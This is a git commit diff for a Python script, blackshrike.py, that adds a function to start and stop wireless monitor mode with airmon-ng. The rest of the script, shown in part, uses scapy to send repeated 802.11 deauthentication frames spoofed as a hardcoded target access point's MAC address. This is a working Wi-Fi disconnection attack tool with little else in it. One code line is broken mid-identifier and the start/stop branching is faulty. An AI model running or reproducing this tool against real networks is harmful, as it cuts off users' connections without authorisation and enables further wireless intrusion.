9e06e4e851e8bdfaeafc2ce1ef09d889beb70ee0
root <root@laptop>
2017-05-21 20:53:24 +0000

    Add monitor manager

--- blackshrike.py
+++ blackshrike.py
@@ -2,22 +2,27 @@ from scapy.all import *
 import re
 import os 
 import threading 
+from wifi import Cell, Scheme 
 
 target = '5c:57:1a:b8:26:d0'
 armed = 0
 ap_list = []
 
-def initialize_monitor():
+def monitor_manage(cmd):
    wifi_file="/proc/net/wireless"
    if os.path.exists(wifi_file):
         with open(wifi_file) as f:
         for line in f.readlines():
                 if not re.search(r'Inter-',line) and not re.search(r'face',line):
                     iface=line.split(":")[0]
-   if iface:
-        print('Initializing monitor mode [airmon method]')
-        os.system('airmon-ng start {0}'.format(iface.strip()))
-   
+   if iface and cmd == 'start':
+      print('Initializing monitor mode [airmon method]')
+      os.system('airmon-ng start {0}'.format(iface.strip()))
+   if iface and cmd == 'stop':
+      print('Stopping monitor mode [airmon method]')
+      os.system('airmon-ng stop {0}'.format(iface.strip()))
+   else:
+      print('Unknown command or bad interface') 
 
 
 def packet_process(pkt):
@@ -59,15 +64,18 @@ def seek_target():
 
 
 class DisruptOperator(threading.Thread):
-    def __init__(self,count=20,target=None):
+    def __init__(self,count=20,target=None,moni="mon0"):
         threading.Thread.__init__(self)
         self.target=target
         self.count = count
+        self.moni=moni
         self.pkt=scapy.all.RadioTap()/scapy.all.Dot11(addr1="ff:ff:ff:ff:ff:ff",add
 r2=target,addr3=target)/scapy.all.Dot11Deauth()
 
     def run(self):
         print("Starting deauth at {0} packets".format(self.count))
         for item in range(0, self.count):
-            scapy.all.sendp(self.pkt, iface="mon1",count=1, inter=.2, verbose=0)
+            scapy.all.sendp(self.pkt, iface=self.moni,count=1, inter=.2, verbose=0)
 
+
+    
